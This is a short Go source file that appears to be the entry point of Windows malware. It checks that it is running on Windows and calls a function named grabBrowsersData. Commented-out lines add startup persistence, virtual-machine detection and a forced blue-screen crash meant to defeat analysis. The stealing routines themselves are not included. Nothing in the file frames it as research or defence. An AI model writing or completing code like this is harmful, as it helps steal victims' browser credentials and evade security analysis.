package main

import "runtime"

func main() {
	if runtime.GOOS != "windows" {
		return
	}

	//_ = addToStartup()
	//if isRunningInVM() {
	//	triggerBSOD()
	//}
	grabBrowsersData()
}
